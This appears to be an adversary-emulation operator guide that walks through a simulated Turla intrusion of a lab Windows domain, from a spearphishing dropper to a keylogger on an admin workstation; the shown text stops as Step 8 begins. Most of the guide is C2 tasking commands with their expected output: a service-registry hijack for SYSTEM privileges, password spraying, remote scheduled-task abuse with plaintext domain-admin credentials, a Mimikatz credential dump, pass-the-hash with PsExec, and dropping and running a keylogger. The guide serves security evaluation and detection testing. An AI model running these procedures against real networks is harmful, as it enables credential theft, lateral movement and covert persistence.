# Scenario Overview

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---

## Setup

:arrow_right: RDP, do not SSH, to the Kali attacker machine `(176.59.15.33)`.

* Open a new terminal window, cd to the cloned repo control server, clear previous server logs, and start the control server:

```bash
cd /opt/day1/turla/Resources/control_server
rm logs.txt
sudo ./controlServer -c ./config/turla_day1.yml
```

* Ensure that the Carbon and EPIC handlers started up.

## Step 1 - Initial Compromise

:microphone: `Voice Track:`

Step 1 emulates Turla gaining initial access via a spearphishing link sent in
an email to the user `Gunter`.

The link initiates the download of a fake software update executable named
NTFVersion.exe. This executable contains another malicious executable, the
injector for the EPIC implant.

When the fake updater is run by the user:
1. The updater writes the embedded injector to the user's path indicated by the
`%TEMP%` environment variable as `mxs_installer.exe`.
1. The updater adds a `Shell` key value to the current user's `Winlogon`
registry key (`HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`),
where, upon Windows authentication, the injector will be executed in addition
to explorer.exe.

---

### :biohazard: Procedures

:arrow_right: RDP to `hobgoblin (10.20.20.102)` as `Gunter`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open Microsoft Edge, declining all first-run options, and browse to `https://brieftragerin.skt.local/owa`. Login:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open the email from
`noreply@sktlocal.it` and click the link in the email to initiate the download of
`NTFVersion.exe`.

* Once the download has been completed, click the downloaded binary to execute it.

### :moyai: Source Code

* [EPIC Dropper](../../Resources/EPIC/SimpleDropper)
  * [File write of EPIC injector as mxs_installer.exe](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L34-L50)
  * [Registry modification](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L95-L143)
* [EPIC Injector](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>

<br>

## Step 2 - Establish Initial Access

:microphone: `Voice Track:`

Step 2 emulates Turla establishing initial access and performing initial
discovery on the first host.

Eventually, Gunter logs off for the day and logs back in the next day,
executing the persistence mechanism for the EPIC implant.

When executed, the `mxs_installer.exe` will inject EPIC's guard DLL into
`explorer.exe`. After EPIC's guard DLL has been established, it will search for
processes that are typically internet enabled (e.g. `iexplore.exe`,
`msedge.exe`, or `firefox.exe`) and inject an embedded worker DLL. If the
process containing EPIC's worker DLL is killed, EPIC's guard DLL will
search for processes again and re-inject the worker DLL.

EPIC's worker DLL will perform user enumeration and several host discovery
commands automatically after injection. The output is then written
to a log file at `%TEMP%\~D723574.tmp`. EPIC then bzip2 compresses and base64
encodes the data before sending the data in an HTTP request to the hardcoded
proxy server.

The C2 server responds with a UUID for EPIC to save for future communications.
This and all future communications between the C2 server and EPIC are bzip
compressed, AES encrypted, and base64 encoded. The AES session key is RSA
encrypted and packaged with the data in the HTTP request.

---

### :biohazard: Procedures

:o: Close out of all tabs and sign out of the RDP session to `hobgoblin
(10.20.20.102)` as `Gunter`.

:arrow_right: Wait 2 minutes and then re-RDP to `hobgoblin (10.20.20.102)` as `Gunter`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open Microsoft Edge and browse to `https://brieftragerin.skt.local/owa`.

:arrow_right: **Set a timer for 2 minutes** then switch to your Kali control server terminal and
confirm that a new implant has registered and the automated discovery output has been returned in
the server log.

**NOTE:** The injector will wait **2 minutes**, before injecting EPIC's Guard DLL into explorer.exe and,
subsequently, EPIC's worker DLL into Microsoft Edge.

### :moyai: Source Code

* [EPIC Injector](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/)
  * Extract EPIC Guard DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L161-L193)
  * Targeting explorer.exe for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L199-L233)
* [EPIC Guard](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/)
  * Extract EPIC payload DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L161-L193)
  * Targeting browser processes for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L235-L283)
* [EPIC Payload](../../Resources/EPIC/payload/)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
  * User discovery [GetAllUsers](../../Resources/EPIC/payload/src/epic.cpp#L111-L182)
  * Directory discovery [DirectoryDiscovery](../../Resources/EPIC/payload/src/epic.cpp#L257-L298)
  * Write results to log file [WriteResults](../../Resources/EPIC/payload/src/epic.cpp#L311-L345)
  * C2 communications are:
    * [bzip2 compressed](../../Resources/EPIC/payload/src/comms.cpp#L462-L469)
    * [AES encrypted](../../Resources/EPIC/payload/src/comms.cpp#L483-L484)
    * [RSA encrypted AES key](../../Resources/EPIC/payload/src/comms.cpp#L487-L497)
    * [base64 encoded](../../Resources/EPIC/payload/src/comms.cpp#L505)

### :microscope: Cited Intelligence

* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>
* <https://securelist.com/analysis/publications/65545/the-epic-turla-operation/>
* <https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
* <https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf>

<br>

## Step 3 - Discovery and Privilege Escalation

:microphone: `Voice Track:`

Step 3 emulates Turla performing additional discovery using EPIC and privilege
escalation by abusing weak registry permissions.

Once C2 communications have been established between EPIC and the C2 via the
proxy server, initial network enumeration is performed on the first host
where information about the host device, local and domain groups, and network
configurations is collected. 

At this point, the domain controller `bannik (10.20.10.9)` and several domain 
administrator accounts, including `frieda`, are discovered. A custom service is
also discovered.

Next, additional enumeration of the registry is performed and a weak registry
permission for the service `ViperVPN` is discovered and the binary path is
modified to perform privilege escalation.

Eventually the service is restarted manually by a domain admin from the domain
controller to emulate the service being restarted via machine reboot. When the service restarts,
EPIC will be executed with SYSTEM level privileges.

Note that since this domain admin login is part of a whitecarded service restart,
we will not be using this logon session for subsequent activity.

### :biohazard: Procedures

* Within your Kali control server terminal window, right click and select "Split Terminal Horizontally". Be careful not to terminate the control server.

* In your lower terminal tab, copy and paste the first set of discovery commands:
```bash
cd /opt/day1/turla/Resources/control_server
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc'
```
* :heavy_exclamation_mark: Verify that the `ViperVPNSvc` service shows up in the tasklist output towards the end.

```bash
grep 'ViperVPNSvc' logs.txt -i
```

* This should return:
  * >```
    >viperVpn.exe                  <PID> ViperVPNSvc
    >```

* Wait 1 minute before tasking the next command to query the service and who can access it:
```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"'
```

* Wait 1 minute before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:

```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f'
```

:arrow_right: Wait 1 minute before switching to your RDP session to `hobgoblin
(10.20.20.102)`. Minimize (do not close) the `hobgoblin (10.20.20.102)` RDP
window.

:arrow_right: RDP into `bannik (10.20.10.9)`, as `Frieda`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Frieda  | Password3! |

* Close any spurious windows.

* Open up an administrative Powershell session and run the following commands to remotely restart the service:

```powershell
sc.exe \\hobgoblin stop ViperVPNSvc
sc.exe \\hobgoblin start ViperVPNSvc
```
ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually
result in an error `[SC] StartService FAILED 1053`. The EPIC injector will wait
an additional 2 minutes before performing injection. If the `[SC] StartService
FAILED 1053` error occurs in less than 10 seconds and/or you don't receive a
new session, contact your Evals lead.

* Wait 1 minute and then :o: sign out of your RDP session to `bannik (10.20.10.9)` as `Frieda`

:arrow_right: Switch to your Kali attack station and confirm that a new elevated implant has registered.

### :moyai: Source Code

* EPIC
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
  * Write results to log file [WriteResults](../../Resources/EPIC/payload/src/epic.cpp#L311-L345)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf>

<br>

## Step 4 - Persistence

:microphone: `Voice Track:`

Step 4 emulates Turla deploying and installing CARBON-DLL as a second stage
malware onto Gunter's workstation in order to maintain persistence. CARBON-DLL,
a variant of CARBON relying on DLLs and asymmetric encryption, will inject an auxiliary
communications module DLL into an existing browser process on Gunter's workstation
to establish C2 communications via a redirector using HTTP requests. Once this communication
channel is created, the malware will run a few discovery commands on Gunter’s
device.

The CARBON-DLL installer will create the following subdirectories in
`C:\Program Files\Windows NT` for tasking-related files and output:
- `C:\Program Files\Windows NT\2028`
- `C:\Program Files\Windows NT\0511`
- `C:\Program Files\Windows NT\Nlts`

The CARBON-DLL installer will drop the following files to disk:
- CAST-128 encrypted configuration file to
`%programfiles%\Windows NT\setuplst.xml`
- Loader DLL to `%systemroot%\System32\mressvc.dll`
- Orchestrator DLL to `%programfiles%\Windows NT\MSSVCCFG.dll`
- Communications library DLL to `%programfiles%\Windows NT\msxhlp.dll`

After successful file writes, the CARBON-DLL installer will create the `WinSys Restore Service` 
service, written as `WinResSvc`, to execute the loader DLL.

The CARBON-DLL installer then performs two registry writes to make sure that
the service can find the loader DLL and that the service will run under
`svchost`:

1. The loader DLL path is written to registry key
`HKLM:\SYSTEM\CurrentControlSet\services\WinResSvc\Parameters` under the
`ServiceDll` value
1. The service is written to registry key
`HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` under the
`WinSysRestoreGroup` value

Once the service is set up, the CARBON-DLL installer will start the service
before terminating its own execution.

On service execution, the loader DLL `mressvc.dll` will run under `svchost` and
execute the orchestrator DLL `MSSVCCFG.dll`. The orchestrator DLL will then
inject the communications library DLL `msxhlp.dll` into processes typically
using HTTP, such as Internet Explorer. Several configuration, logging, and
tasking files are dropped in `C:\Program Files\Windows NT`. 

---

### :biohazard: Procedures

:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` as `Gunter` 

* Ensure you have a Microsoft Edge window open with OWA. If not:

  * Open up Microsoft Edge and browse to `https://brieftragerin.skt.local/owa`. Login:

  | Username   | Password |
  | :--------: | :---------------: |
  | skt\Gunter  | Password1! |

:arrow_right: Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:
```bash
./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe'
```

* Once the download has completed successfully, wait 1 minute and then task the EPIC implant to execute the CARBON-DLL installer:
```bash
./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe'
```

* CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered  with the C2 server
  * 📷 - upload a screenshot of the new implant session.

* Wait 1 minute and then task the Carbon implant to execute some discovery commands:
```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 0, "cmd": "whoami"}'
```

### :moyai: Source Code

* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Comms Lib DLL Injection](../../Resources/Carbon/Orchestrator/src/injection.cpp#L454)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
* EPIC
  * File download [DownloadFile](../../Resources/EPIC/payload/src/epic.cpp#L441-L466)


### :microscope: Cited Intelligence

* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>

<br>

## Step 5 - Lateral Movement to Domain Controller

:microphone: `Voice Track:`

Step 5 emulates Turla laterally moving to the domain controller by conducting
password spraying to retrieve a domain admin's credentials to the domain
controller and using a scheduled task to gain execution on the domain
controller.

CARBON-DLL downloads a batch script which uses sprays several of the discovered
domain admin accounts with weak passwords, one of which successfully mounts the
`C:\` drive of the domain controller.

In preparation for lateral movement, CARBON-DLL downloads a second copy of
its installer and moves it to the `System32` directory of the domain controller.
Then, the `Customer Experience Improvement Program`'s `Consolidator` scheduled
task is modified to execute the CARBON-DLL installer.

Lastly, CARBON-DLL sends a request to run the modified scheduled task,
achieving lateral movement to and execution on the domain controller.

By this point, Frieda has logged into the domain controller to start a browser
process as part of legitimate user activity, which the new CARBON-DLL implant
injects into to begin kicking off its communication with the C2 server.

Rather than communicate directly to the C2 redirector over HTTP, the new CARBON-DLL
implant uses peer-to-peer communication over named pipes through the first
CARBON-DLL implant on `hobgoblin (10.20.20.102)`. Discovery commands are then executed,
leading to the identification of an Apache web server and the workstation for
the administrator of the Apache server, `Adalwolfa`.

Peer-to-peer communication will occur over the `dsnap` named pipe on both participating hosts.

---

### :biohazard: Procedures

:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` as
`Gunter`. Minimize (do not close) the `hobgoblin (10.20.20.102)` RDP window. 

* Start a new RDP session to `bannik (10.20.10.9)` as `Frieda`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Frieda  | Password3! |

* Close any spurious windows

* Open up Microsoft Edge (search for `Edge` if not in toolbar, **do not use Edge Beta**), decline all first-run start up options, and browse to `https://brieftragerin.skt.local/owa`

:arrow_right: Wait 1 minute and return to your Kali control server terminal

* Task CARBON-DLL to download and execute the batch script to spray weak
passwords against the domain admin accounts and attempt to mount the `C$` drive of the DC.

```bash
./evalsC2client.py --set-task 9b5ef515  '{"id": 1, "payload": "password_spray.bat", "payload_dest": "C:\\Windows\\Temp\\winsas64.bat", "cmd": "C:\\Windows\\Temp\\winsas64.bat"}'
```
* :heavy_exclamation_mark: Verify that the script successfully sprays `Frieda`'s password by checking the task output.
You should see task output which states the following. It should take approximately 5 minutes to complete:
  * > ```text
    > The command completed successfully.
    >
    > frieda:Password3! SUCCESS
    > ```

* Wait 1 minute and then task CARBON-DLL to remove the password spray script.
```bash
./evalsC2client.py --set-task 9b5ef515  '{"id": 2, "cmd": "del /Q C:\\Windows\\Temp\\winsas64.bat"}'
```

* Wait 1 minute and then task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the `System32` folder
on the DC via the mounted drive.

```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 3, "payload": "carbon_installer_2.exe", "payload_dest": "C:\\Windows\\Temp\\wmimetricsq.exe", "cmd": "move C:\\Windows\\Temp\\wmimetricsq.exe \\\\bannik\\C$\\Windows\\System32"}'
```

* Wait 1 minute and then task CARBON-DLL to enumerate remote scheduled tasks on
the domain controller, using the discovered password for the domain admin
`Frieda`

```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 4, "cmd": "schtasks /query /S bannik /U skt\\Frieda /P Password3!"}'
```

* :exclamation: Verify that the `Consolidator` task under the `\Microsoft\Windows\Customer
Experience Improvement Program\` task folder appears in the output.

```bash
grep 'Folder: \\Microsoft\\Windows\\Customer Experience Improvement Program' logs.txt -A 5 -i
```

* This should return:
  * >    ```
    >    Folder: \Microsoft\Windows\Customer Experience Improvement Program
    >    TaskName                                 Next Run Time          Status         
    >    ======================================== ====================== ===============
    >    Consolidator                             2/24/2023 12:00:00 AM  Ready          
    >    UsbCeip                                  N/A                    Ready      
    >    ```

* Wait 1 minute and then task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain
admin `Frieda` (<https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a>).

```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 5, "cmd": "schtasks /Change /S bannik /U skt\\Frieda /P Password3! /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /TR %SystemRoot%\\System32\\wmimetricsq.exe"}'
```

* Wait 1 minute and then task CARBON-DLL to remotely start the modified scheduled task on the domain controller.

```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 6, "cmd": "schtasks /Run /S bannik /U skt\\Frieda /P Password3! /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\" /I"}'
```

:arrow_right: Return to your control server output and confirm the registration of a new
CARBON-DLL implant on the domain controller.

:arrow_right: Return to your tasking window and task the new CARBON-DLL implant
with discovery commands to be run on the domain controller.

```bash
./evalsC2client.py --set-task a3e63922 '{"id": 0, "cmd": "net group /domain"}'
```
:heavy_exclamation_mark: Verify that the `Web Servers` and `Web Server Admins` groups are in the output.


* Wait 1 minute and then task CARBON-DLL to enumerate both groups for their members.
```bash
./evalsC2client.py --set-task a3e63922 '{"id": 1, "cmd": "net group \"Web Servers\" /domain && net group \"Web Server Admins\" /domain"}'
```

* Wait 1 minute and then task CARBON-DLL to enumerate the Active Directory
Computers.
```bash
./evalsC2client.py --set-task a3e63922 '{"id": 2, "cmd": "dsquery * -filter \"(&(objectclass=computer))\" -attr *"}'
```

* Ensure `khabibulin` is in the output and confirm the `Description` value is
"Adalwolfa Workstation".

```bash
grep 'cn: khabibulin' logs.txt -C 2 -i
```

* This should return:
  * > ```
    > objectClass: user
    > objectClass: computer
    > cn: khabibulin
    > description: Adalwolfa Workstation
    > distinguishedName: CN=khabibulin,CN=Computers,DC=skt,DC=local
    > ```

### :moyai: Source Code

* [Password spray batch script](../../Resources/payloads/carbon/password_spray.bat)
* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Comms Lib DLL Injection](../../Resources/Carbon/Orchestrator/src/injection.cpp#L454)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
  * [Peer to peer communications over named pipes](../../Resources/Carbon/CommLib/src/NamedPipeP2p.cpp)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>

<br>

## Step 6 - Preparation for Lateral Movement onto Second Host 

:microphone: `Voice Track:`

Step 6 emulates Turla downloading and executing Mimikatz as `terabox.exe` 
after gaining persistance on the machine. Execution of Mimikatz will reveal a 
cached NTLM hash for the admin user `Adalwolfa`. This username/hash combination 
will be used in the next step for lateral movement.

---

### :biohazard: Procedures

* From your Kali C2 terminal, task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump (note that the file gets downloaded to `C:\Windows\\Temp\` and then gets moved to `C:\Windows\System32` after download since the CARBON-DLL communications library module cannot download directly to privileged locations):

```bash
./evalsC2client.py --set-task a3e63922 '{"id": 3, "payload": "mimikatz.exe", "payload_dest": "C:\\Windows\\Temp\\terabox.exe", "cmd": "move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \"lsdu::go /ynot\" \"quit\""}'
```

* :exclamation: Verify that the NTLM hash for `adalwolfa` is included in the output.

```bash
grep 'NTLM : 07d128430a6338f8d537f6b3ae1dc136' logs.txt -C 5 -i
```

* This should return:
  * >    ```
    >    RID  : 00000456 (1110)
    >    User : Adalwolfa
    >
    >    * Primary
    >        NTLM : 07d128430a6338f8d537f6b3ae1dc136
    >        LM   : 
    >    Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
    >        ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
    >        lm  - 0: 95b8536c32208871930216e62d5e12d4
    >    ```

### :moyai: Source Code

* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
  * [Peer to peer communications over named pipes](../../Resources/Carbon/CommLib/src/NamedPipeP2p.cpp)
* [Mimikatz](../../Resources/Mimikatz)

### :microscope: Cited Intelligence

* [Report 4: SwissCERT - RUAG Report](https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html)
* [Report 9: Symantec - Waterbug New Toolset](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments)
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>

<br>

## Step 7 - Lateral Movement to Second Workstation

:microphone: `Voice Track:`

Step 7 emulates Turla preparing for and performing lateral movement to a second
workstation in the domain, the Windows workstation belonging to Adalwolfa.

Adalwolfa logs into their workstation `khabibulin (10.20.20.104)` and opens up
Edge to prepare for their legitimate user activity.

In the meantime, the CARBON-DLL implant on the domain controller downloads
PsExec and a third copy of the CARBON-DLL installer, downloading both initially
to `C:\Windows\Temp` before moving both executables to `C:\Windows\System32\`.

Next, using the Mimikatz binary previously downloaded to the domain controller
and Adalwolfa's discovered NTLM hash, CARBON-DLL performs pass-the-hash to copy
the installer to Adalwolfa's workstation and PsExec to remotely execute the
installer to install CARBON-DLL on Adalwolfa's workstation.

---

### :biohazard: Procedures

:arrow_right: Return to your RDP session to `bannik (10.20.10.9)` as `Frieda`.
Minimize (do not close) the `bannik (10.20.10.9)` RDP window.

* Start a new RDP session to `khabibulin (10.20.20.104)` as `adalwolfa`:

| Username   | Password |
| :--------: | :---------------: |
| skt\adalwolfa  | Password2! |

* Close any spurious windows

* Open up Edge, but don't browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.

:arrow_right: Wait 1 minute and return to your Kali control server terminal

* Task the CARBON-DLL implant on the domain controller to download PsExec.

```bash
./evalsC2client.py --set-task a3e63922 '{"id": 4, "payload": "PsExec.exe", "payload_dest": "C:\\Windows\\Temp\\tmp5712.tmp", "cmd": "move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe"}'
```

* Wait 1 minute and then task the CARBON-DLL implant on the domain controller
to download a third copy of the CARBON-DLL installer.

```bash
./evalsC2client.py --set-task a3e63922 '{"id": 5, "payload": "carbon_installer_3.exe", "payload_dest": "C:\\Windows\\Temp\\tmp1283.tmp", "cmd": "move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe"}'
```

* Wait 1 minute and then task the CARBON-DLL implant on the domain controller
to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the
installer to Adalwolfa's workstation and (2) execute it using PsExec.

```bash
./evalsC2client.py --set-task a3e63922 '{"id": 6, "cmd": "C:\\Windows\\System32\\terabox.exe \"pr::d\" \"slsa::htp /user:adalwolfa /domain:skt /ntlm:07d128430a6338f8d537f6b3ae1dc136 /remotepc:khabibulin /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\" \"quit\""}'
```

:heavy_exclamation_mark: Verify that a new Carbon implant has been registered with the control server.

* Wait 1 minute and then task the CARBON-DLL implant on the domain controller to clean up dropped files.
```bash
./evalsC2client.py --set-task a3e63922 '{"id": 7, "cmd": "del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe"}'
```

### :moyai: Source Code

* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Comms Lib DLL Injection](../../Resources/Carbon/Orchestrator/src/injection.cpp#L454)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
  * [Peer to peer communications over named pipes](../../Resources/Carbon/CommLib/src/NamedPipeP2p.cpp)
* [Mimikatz](../../Resources/Mimikatz)

### :microscope: Cited Intelligence

* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments>
* <https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>

<br>

## Step 8 - Credential Access on Admin Host

:microphone: `Voice Track:`

Step 8 emulates Turla dropping a custom keylogger binary (`wingtsvcupdt.exe`) on
`Adalwolfa`'s workstation and harvesting credentials from the system.

Once the tools have been dropped by the CARBON-DLL, the keylogger is executed
and begins logging keystrokes to `%temp%\~DFA512.tmp` The keylogger is used
to collect SSH credentials that `Adalwolfa` was using on their system while the
keylogger was running.

Meanwhile, Adalwolfa is using their Edge browser session to visit the website
hosted by the Apache server to check one of the pages. The user then opens
PowerShell and connects to the Apache server via SSH, where their plaintext
credentials are captured by the keylogger. `Adalwolfa` then navigates to the
directory containing the webpage file on the Apache server and opens the file
to make a small change.

---

### :biohazard: Procedures

* From your Kali C2 server terminal window, task the CARBON-DLL on Adalwolfa's workstation to download and execute the
keylogger binary in the background:
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 0, "payload": "keylogger.exe", "payload_dest": "C:\\Windows\\Temp\\wingtsvcupdt.exe", "cmd": "C:\\Windows\\Temp\\wingtsvcupdt.exe -r"}'
```

:arrow_right: Wait 1 minute and then return to your RDP session to `khabibulin (10.20.20.104)` as `adalwolfa`.

* From the workstation, as the `Adalwolfa` user account:
  * Open Edge.
